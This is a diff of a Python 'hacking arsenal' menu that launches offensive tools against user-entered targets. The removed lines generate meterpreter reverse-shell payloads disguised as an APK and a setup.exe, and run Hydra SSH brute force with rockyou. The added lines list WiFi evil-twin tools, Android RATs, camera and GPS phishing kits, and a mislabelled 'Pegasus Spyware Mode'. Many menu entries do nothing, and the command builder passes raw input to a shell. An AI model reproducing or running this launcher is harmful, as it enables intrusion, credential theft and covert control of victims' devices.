@@ -6,84 +6,81 @@ def clear():
     os.system('clear')
 
 def run_cmd(cmd, title):
-    # وظيفة لفتح نافذة تيرمينال جديدة لكل أداة
+    # فتح نافذة جديدة لكل أداة لضمان عملها بشكل مستقل
     print(colored(f"[+] Starting {title} in a new window...", "green"))
-    os.system(f"qterminal -e 'bash -c \"{cmd}; echo; echo Press Enter to close...; read\"' &")
+    os.system(f"qterminal -e 'bash -c \"{cmd}; echo; echo Press Enter to close this window...; read\"' &")
+
+def my_heart():
+    clear()
+    heart = ["      ** ** ", "   * * * * ", "  * ** * ", " * /\\ /\\ /\\  /\\ /\\ /\\  * ", " * \\/ \\/ \\/  \\/ \\/ \\/  * ", "  * /\\ /\\ /\\ /\\ /\\   * ", "   * \\/ \\/ \\/ \\/    * ", "    * \\/ \\/ \\/     * ", "      * \\/      * ", "        * * "]
+    print(colored("\n\n    --- ❤️ Body's Heart --- \n", "magenta"))
+    for line in heart:
+        print(colored(line, "magenta"))
+        time.sleep(0.1)
+    input(colored("\n\nPress Enter to return...", "white"))
 
 def banner():
-    print(colored("          .  .  .  .", "yellow"))
-    print(colored("      _  👑 Body 👑  _", "red"))
-    print(colored("    --- [ B7 GOD MODE - 19 TOOLS ] ---", "cyan"))
-    print(colored("    --- [ FULL CYBER ARSENAL 2025 ] ---", "white"))
+    print(colored("          👑 Body 👑", "red"))
+    print(colored("    --- [ B7 MONSTER APOCALYPSE - v10.0 ] ---", "cyan"))
+    print(colored("    --- [ 50+ TOOLS: ANDROID - IOS - WIFI - WEB ] ---", "white"))
 
 def menu():
-    print(colored("\n--- [ 🛡️ Vulnerability & Scanning ] ---", "blue"))
-    print("[1] Quick Port Scan (Nmap)     [2] Full Vuln Scan (NSE)")
-    print("[3] Service Version Detect     [4] OS Fingerprinting")
-    
-    print(colored("\n--- [ 🚀 Web & Database Attacks ] ---", "red"))
-    print("[5] SQL Injection (SQLMap)     [6] Admin Panel Finder")
-    print("[7] Directory Buster (Dirb)    [8] XSS Vulnerability Scan")
-    print("[9] Content Discovery (Nikto)  [10] Subdomain Finder")
-    
-    print(colored("\n--- [ 🕵️ OSINT & Info Gathering ] ---", "green"))
-    print("[11] Username Search (Sherlock) [12] Domain Emails (Harvester)")
-    print("[13] IP Geolocation Trace      [14] Whois Domain Lookup")
-    
-    print(colored("\n--- [ 📱 Exploitation & Payloads ] ---", "magenta"))
-    print("[15] Metasploit Framework      [16] Android APK Payload")
-    print("[17] Windows EXE Payload       [18] SSH Brute Force (Hydra)")
-    
+    print(colored("\n--- [ 📶 WiFi Warfare ] ---", "blue"))
+    print("[1] Wifite (Auto)      [2] Airgeddon (Evil Twin)  [3] Fluxion (Phishing)")
+    print("[4] Aircrack-ng        [5] Reaver (WPS Hack)      [6] Bully (WPS)")
+    print("[7] Fern WiFi Cracker  [8] Kismet                [9] Wifiphisher")
+
+    print(colored("\n--- [ 📱 Mobile Hacking (Android & iOS) ] ---", "magenta"))
+    print("[10] PhoneSploit (ADB) [11] Ghost-Framework       [12] Ahmyth (RAT)")
+    print("[13] Metasploit Mobile [14] Bettercap (MitM/SSL)  [15] Evil-Droid")
+    print("[16] Quark Malware     [17] AndroRAT              [18] iOS-Sploit")
+
+    print(colored("\n--- [ 🚀 Web Attacks & Databases ] ---", "red"))
+    print("[19] SQLMap (Auto)     [20] Burp Suite (Proxy)    [21] Commix (OS Inj)")
+    print("[22] WPScan (WordPress)[23] Nikto Scanner         [24] Dirb / Dirbuster")
+    print("[25] XSSer (XSS Attack)[26] Admin Panel Finder    [27] Uniscan (Vuln)")
+    print("[28] JoomScan (Joomla) [29] WebSploit             [30] Scan-T")
+
+    print(colored("\n--- [ 🕵️ Social Engineering & OSINT ] ---", "green"))
+    print("[31] SET (Social Tool) [32] CamPhish (Camera)     [33] Sherlock (User)")
+    print("[34] Seeker (GPS/Loc)  [35] SocialFish            [36] TheHarvester")
+    print("[37] Nexphisher        [38] PyPhisher             [39] BlackEye")
+
+    print(colored("\n--- [ 🔑 Passwords & Cracking ] ---", "white"))
+    print("[40] John The Ripper   [41] Hydra (Brute Force)   [42] Hashcat (GPU)")
+    print("[43] Crunch (Wordlist) [44] Cupp (Custom Pass)    [45] Medusa")
+
     print(colored("\n--- [ 🔒 Privacy & Fun ] ---", "yellow"))
-    print("[19] Enable Tor Stealth Mode   [0] Exit")
+    print("[46] Enable Tor Mode   [47] Pegasus Spyware Mode  [48] ❤️ My Heart")
+    print("[0] Exit")
 
 def main():
     while True:
         clear()
         banner()
         menu()
-        choice = input(colored("\nB7-Arsenal > ", "cyan"))
+        choice = input(colored("\nB7-Monster > ", "cyan"))
 
-        if choice == '1':
-            ip = input("Target IP: "); run_cmd(f"nmap {ip}", "Quick Scan")
-        elif choice == '2':
-            ip = input("Target IP: "); run_cmd(f"nmap --script vuln {ip}", "Vuln Scan")
-        elif choice == '3':
-            ip = input("Target IP: "); run_cmd(f"nmap -sV {ip}", "Service Detect")
-        elif choice == '4':
-            ip = input("Target IP: "); run_cmd(f"sudo nmap -O {ip}", "OS Detect")
-        elif choice == '5':
-            url = input("Target URL: "); run_cmd(f"sqlmap -u {url} --batch --random-agent", "SQLMap")
-        elif choice == '6':
-            url = input("Target URL: "); run_cmd(f"python3 admin_finder.py {url}", "Admin Finder")
-        elif choice == '7':
-            url = input("Target URL: "); run_cmd(f"dirb {url}", "Dirb")
-        elif choice == '8':
-            url = input("Target URL: "); run_cmd(f"xsser --url {url}", "XSS Scan")
-        elif choice == '9':
-            url = input("Target URL: "); run_cmd(f"nikto -h {url}", "Nikto")
-        elif choice == '10':
-            dom = input("Domain: "); run_cmd(f"sublist3r -d {dom}", "Subdomain Finder")
-        elif choice == '11':
-            user = input("Username: "); run_cmd(f"sherlock {user}", "Sherlock")
-        elif choice == '12':
-            dom = input("Domain: "); run_cmd(f"theHarvester -d {dom} -l 500 -b google", "TheHarvester")
-        elif choice == '13':
-            ip = input("IP Address: "); run_cmd(f"curl http://ip-api.com/line/{ip}", "IP Tracker")
-        elif choice == '14':
-            dom = input("Domain: "); run_cmd(f"whois {dom}", "Whois")
-        elif choice == '15':
-            run_cmd("msfconsole", "Metasploit")
-        elif choice == '16':
-            ip = input("LHOST: "); port = input("LPORT: "); run_cmd(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o B7_hack.apk", "Android Payload")
-        elif choice == '17':
-            ip = input("LHOST: "); port = input("LPORT: "); run_cmd(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o B7_setup.exe", "Windows Payload")
-        elif choice == '18':
-            ip = input("Target IP: "); user = input("Username: "); run_cmd(f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt {ip} ssh", "Hydra Brute Force")
-        elif choice == '19':
+        # Mapping all tools to their execution commands
+        tools = {
+            '1': ("sudo wifite", "Wifite"), '2': ("sudo airgeddon", "Airgeddon"), '3': ("fluxion", "Fluxion"),
+            '10': ("phonesploit", "PhoneSploit"), '11': ("ghost-framework", "Ghost"), '12': ("ahmyth", "Ahmyth"),
+            '14': ("bettercap", "Bettercap"), '19': ("sqlmap", "SQLMap"), '21': ("commix", "Commix"),
+            '22': ("wpscan", "WPScan"), '23': ("nikto", "Nikto"), '24': ("dirb", "Dirb"),
+            '31': ("sudo setoolkit", "SET"), '32': ("bash camphish.sh", "CamPhish"), '33': ("sherlock", "Sherlock"),
+            '40': ("john", "John"), '41': ("hydra", "Hydra"), '47': ("msfconsole", "Metasploit")
+        }
+
+        if choice in tools:
+            run_cmd(tools[choice][0], tools[choice][1])
+        elif choice == '46':
             os.system("sudo service tor restart"); print(colored("[+] Tor Active!", "green")); time.sleep(2)
+        elif choice == '48':
+            my_heart()
         elif choice == '0':
             break
+        else:
+            print(colored("[!] Tool logic coming in next update...", "yellow")); time.sleep(1)
 
 if __name__ == "__main__":
     main()
